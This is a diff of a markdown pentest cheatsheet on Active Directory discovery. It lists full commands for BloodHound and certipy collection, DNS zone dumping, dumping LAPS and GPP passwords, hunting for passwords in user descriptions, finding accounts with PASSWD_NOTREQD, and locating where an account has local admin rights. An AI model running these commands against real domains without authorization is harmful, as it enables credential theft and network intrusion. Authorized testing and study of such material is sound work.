@@ -3,7 +3,7 @@ layout: post
 title: pen / ad / discov
 category: pen
 parent: cheatsheets
-modified_date: 2023-06-26
+modified_date: 2023-09-07
 permalink: /pen/ad/discov
 ---
 
@@ -17,12 +17,16 @@ permalink: /pen/ad/discov
 * [collect](#collect)
 	* [adexplorersnapshot](#adexplorersnapshot)
 	* [bloodhound.py](#bloodhound.py)
+	* [certipy](#certipy)
 	* [dnschef](#dnschef)
 * [shoot](#shoot)
 	* [shoot-forest](#shoot-forest)
+	* [shoot-dns](#shoot-dns)
 	* [shoot-dom](#shoot-dom)
 		* [shoot-dcs](#shoot-dcs)
+		* [shoot-adcs](#shoot-adcs)
 		* [shoot-desc-users](#shoot-desc-users)
+		* [shoot-laps](#shoot-laps)
 		* [shoot-pwd-notreqd](#shoot-pwd-notreqd)
 		* [shoot-pwd-policy](#shoot-pwd-policy)
 		* [shoot-delegations](#shoot-delegations)
@@ -36,8 +40,8 @@ permalink: /pen/ad/discov
 * [iter](#iter)
 	* [iter-memberof](#iter-memberof)
 	* [iter-scope](#iter-scope)
-		* [iter-dacl](#iter-dacl)
-		* [iter-gpos](#iter-gpos)
+	* [iter-dacl](#iter-dacl)
+	* [iter-gpos](#iter-gpos)
 * [refresh](#refresh)
 	* [check-computer-sessions](#check-computer-sessions)
 	* [last-logons](#last-logons)
@@ -75,7 +79,7 @@ permalink: /pen/ad/discov
 
 ### <a name='adexplorersnapshot'></a>adexplorersnapshot
 * usage: convert ADExplorer snapshot to BloodHound json files:
-```
+```sh
 mkdir $zdom_dc_fqdn
 ADExplorerSnapshot.py -o $zdom_dc_fqdn -m BloodHound $zdom_dc_fqdn".dat"
 ```
@@ -83,25 +87,36 @@ ADExplorerSnapshot.py -o $zdom_dc_fqdn -m BloodHound $zdom_dc_fqdn".dat"
 ### <a name='bloodhound.py'></a>bloodhound.py
 ```sh
 bloodhound.py -c DConly -dc $zdom_dc_fqdn -u $ztarg_user_name -p $ztarg_user_pass -d $zdom_fqdn
-bloodhound.py -c DConly -dc $zdom_dc_fqdn -u $ztarg_user_name -p $ztarg_user_pass -d $zdom_fqdn -ns 127.0.0.1
 ```
 
 [Collection methods](https://github.com/fox-it/BloodHound.py#installation-and-usage) are not the same as sharphound's ones.
 
-### <a name='dnschef'></a>dnschef
-* set up a nameserver in localhost :
+### <a name='certipy'></a>certipy
 ```sh
-sudo dnschef --fakeip $zdom_dc_ip --fakedomains $zdom_fqdn -q
+# download the bloodhound customqueries made by ly4k
+cd ~/.config/bloodhound​
+wget https://raw.githubusercontent.com/ly4k/Certipy/main/customqueries.json​
+
+# run the tool certipy as per below​
+certipy find –u $ztarg_user_name@$zdom_fqdn -p $ztarg_user_pass –dc-ip $zdom_dc_ip –bloodhound​
+
+# drag and drop the ZIP result file into BloodHound GUI
 ```
-* add the ns option to bloodhood.py ```-ns 127.0.0.1``` 
+
+### <a name='dnschef'></a>dnschef
+```sh
+# set up a nameserver in localhost
+sudo dnschef --fakeip $zdom_dc_ip --fakedomains $zdom_fqdn -q
+
+# add the ns option to bloodhood.py `-ns 127.0.0.1` 
+bloodhound.py -c DConly -dc $zdom_dc_fqdn -u $ztarg_user_name -p $ztarg_user_pass -d $zdom_fqdn -ns 127.0.0.1
+```
 
 ## <a name='shoot'></a>shoot
 
 SHOOT General Properties :
 
 ### <a name='shoot-forest'></a>shoot-forest
-
-Forest properties:
 ```sh
 # Enum domains and trusts: V1
 pywerview.py get-netdomaintrust -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip > $zcase"_get-netdomaintrust.txt"
@@ -113,7 +128,7 @@ rpcclient> enumdomains
 rpcclient> enumtrusts
 
 # Enum domains and trusts: V3
-./bloodhound.py -dc $ztarg_dc_fqdn -d $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass -c Trusts
+./bloodhound.py -dc $zdom_dc_fqdn -d $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass -c Trusts
 python
 >>> import json
 with open ("X.json","r+") as f:                                                                                     
@@ -126,7 +141,7 @@ cut -f1 -d" " trusts.txt > $zcase"_trusts_clean.txt"
 for i in `cat $zcase"_trusts_clean.txt"`; do ping -a $i; done
 ```
 
-### <a name='shoot-dom'></a>shoot-dns
+### <a name='shoot-dns'></a>shoot-dns
 ```sh
 # https://github.com/dirkjanm/adidnsdump
 # https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/
@@ -138,13 +153,12 @@ adidnsdump -u $zdom"\\"$ztarg_user_name --print-zones $zdom_dc_fqdn
 adidnsdump -u $zdom"\\"$ztarg_user_name --zone $zdom_fqdn $zdom_dc_fqdn
 
 # keywords per target
-vcenter hyper adm docker ilo pam vdi vault
-webcam print prt share file nfs cifs ftp ldap
-kibana elastic sql db hadoop splunk siem qradar
-sap crm
+# vcenter vmw hyper adm docker ilo pam vdi vault
+# webcam print prt share file nfs cifs ftp ldap
+# kibana elastic sql db hadoop splunk siem qradar
+# sap crm
+keyword=""
 grep "A," records.csv | grep -i $keyword 
-
-
 ```
 
 ### <a name='shoot-dom'></a>shoot-dom
@@ -174,13 +188,18 @@ nmap $zdom_fqdn --script dns-srv-enum --script-args "dns-srv-enum.domain='$zdom_
 nbtscan -r 10.0.0.0/24
 ```
 
+#### <a name='shoot-adcs'></a>shoot-adcs
+```sh
+certipy find -u $ztarg_user_name -p $ztarg_user_pass $zdom_fqdn 
+```
+
 #### <a name='shoot-desc-users'></a>shoot-desc-users
 ```sh
 cme ldap -u $ztarg_user_name -p $ztarg_user_pass -kdcHost $zdom_dc_fqdn -d $zdom_fqdn -M get-desc-users > $zcase"_cme_ldap_get-desc-users.txt"
 grep -i "pass|pw|=" $zcase"_cme_ldap_get-desc-users.txt"
 ```
 
-#### <a name='shoot-desc-users'></a>shoot-laps
+#### <a name='shoot-laps'></a>shoot-laps
 ```sh
 # https://github.com/n00py/LAPSDumper
 python laps.py -u $ztarg_user_name -p $ztarg_user_pass -d $zdom_fqdn
@@ -188,15 +207,22 @@ python laps.py -u $ztarg_user_name -p $ztarg_user_pass -d $zdom_fqdn
 
 #### <a name='shoot-pwd-notreqd'></a>shoot-pwd-notreqd
 ```sh
+# NT hash for empty password: 31D6CFE0D16AE931B73C59D7E0C089C0
+# Ldapsearch 
+ldapsearch (&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32)(!(userAccountControl:1.2.840.113556.1.4.803:=2))) cn 
+
+# BloodHound 
+MATCH (n:User {enabled: True, passwordnotreqd: True}) RETURN n
 ```
 source: [learn.microsoft](https://learn.microsoft.com/en-us/archive/blogs/russellt/passwd_notreqd)
 
 #### <a name='shoot-pwd-policy'></a>shoot-pwd-policy
 ```sh
-crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --pass-pol
+crackmapexec smb $ztarg_dc_ip -u $ztarg_user_name -p $ztarg_user_pass --pass-pol
 
 # Get the domain pasword policy
-rpcclient -U $ztarg_user_name --password $ztarg_user_pass -I $ztarg_dc_ip  
+# rpcclient -U $ztarg_user_name --password $ztarg_user_pass -I $ztarg_dc_ip (DEPRECATED)
+rpcclient -k -I $ztarg_dc_ip  
 rpcclient> getdompwinfo
 ```
 
@@ -271,6 +297,12 @@ cat "$zcase""_get-adobject_""$ztarg_ou_nick"".txt" | grep samaccountname |awk '{
 DS-Replication-Get-Changes
 DS-Replication-Get-Changes-In-Filtered-Set
 
+# Computers with older OS versions
+
+
+# Computers with password last set over 90 days ago
+ 
+
 ```
 
 #### <a name='shoot-gpp'></a>shoot-gpp
@@ -283,6 +315,7 @@ Get-GPPPassword.py $zz@$zdom_dc_ip
 ```
 
 #### <a name='shoot-shares'></a>shoot-shares
+
 #### <a name='shoot-mssql-servers'></a>shoot-mssql-servers
 
 #### <a name='shoot-spns'></a>shoot-spns
@@ -316,10 +349,10 @@ pywerview.py get-netuser -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass -
 egrep -i  "^(cn|whenCreated|accountExpires|pwdLastSet|lastLogon|logonCount|badPasswordTime|badPwdCount)" $zcase"_"$ztarg_computer"_"$ztarg_user_next".txt"
 
 # Get user memberof info
-pywerview.py get-netgroup -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip --username XXX | grep -v "^$" | cut -f2 -d" "  > $zcase"_getnetgroup_xxx.txt"
+pywerview.py get-netgroup -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip --username $ztarg_user_next | grep -v "^$" | cut -f2 -d" "  > $zcase"_getnetgroup_xxx.txt"
 
 # Get the machine's full-data
-pywerview.py get-netcomputer -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip --computername XXX --full-data > $zcase"_getnetcomputer_xxx.txt"
+pywerview.py get-netcomputer -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip --computername $ztarg_user_next --full-data > $zcase"_getnetcomputer_xxx.txt"
 
 # Get the machines based on an adspath / OU
 ztarg_ou="OU=Workstations,"$zdom_fqdn
@@ -333,12 +366,12 @@ pywerview.py get-netgpo -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass -a
 ### <a name='iter-scope'></a>iter-scope
 ```bash
 # Find where the account is local admin V1
-./bloodhound.py -dc $zdom_dc_ip -d $zdom_fqdn -u $ztarg_user_name -p XXX -c LocalAdmin --computerfile pt_xxx_getnetcomputer_ou_x.txt
-cat 2023xxxxxxx_computers.json | jq '.data[] | select(.LocalAdmins.Collected==true)'| jq '.Properties.name' > $zcase"_fla_pwn.txt"
+./bloodhound.py -dc $zdom_dc_ip -d $zdom_fqdn -u $ztarg_user_name -p XXX -c LocalAdmin --computerfile $zcase"_getnetcomputer_ou_x.txt"
+cat x_computers.json | jq '.data[] | select(.LocalAdmins.Collected==true)'| jq '.Properties.name' > $zcase"_fla_pwn.txt"
 
 # Find where the account is local admin V2
-cme winrm pt_xxx_getnetcomputer_ou_x.txt -d $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass
-cme smb pt_xxx_getnetcomputer_ou_x.txt -d $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass
+cme winrm $zcase"_getnetcomputer_ou_x.txt" -d $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass
+cme smb $zcase"_getnetcomputer_ou_x.txt" -d $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass
 
 # Get the DNs of the owned machines 
 # Get the DNs of the owned machines / get the cn computer (1 line) and its DN (1 line)
@@ -383,20 +416,16 @@ pywerview get-netgroupmember --groupname "Domain Admins" -u $ztarg_user_name -p 
 ```
 
 ### <a name='last-logons-ou'></a>last-logons-ou
-
-Who is logged on a computer:
-```bash
+```sh
+# who is logged on a computer
 
 ```
 ### <a name='whereis-user'></a>whereis-user
+
 ### <a name='whereis-group'></a>whereis-group
 
 ## <a name='sources'></a>sources
 
+* [ADCS specterops](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
+* [DACL specterops](https://specterops.io/wp-content/uploads/sites/3/2022/06/an_ace_up_the_sleeve.pdf)
 * [multiple neo4j databases](https://neo4j.com/developer/manage-multiple-databases/) 💥 ENTERPRISE-ONLY ✅ WORKAROUND: [DOCKER CONTAINER](/sys/docker/neo4j)
-* [enum4linux queries](https://labs.portcullis.co.uk/tools/enum4linux/)
-* [Fun with LDAP & Kerberos - ThotCon 2017](https://github.com/jomivz/cybrary/blob/master/purpleteam/red/windows/LDAP%20Service%20and%20Kereberos%20Protocol%20Attacks.pdf) 
-* [AD Enumeration on Linux OS - YT](https://www.youtube.com/watch?v=2Xfd962QfPs)
-* [RPCclient cookbook](https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html)
-* [Other LDAP queries examples](https://theitbros.com/ldap-query-examples-active-directory/)
-* [Other LDAP queries examples](https://posts.specterops.io/an-introduction-to-manual-active-directory-querying-with-dsquery-and-ldapsearch-84943c13d7eb)
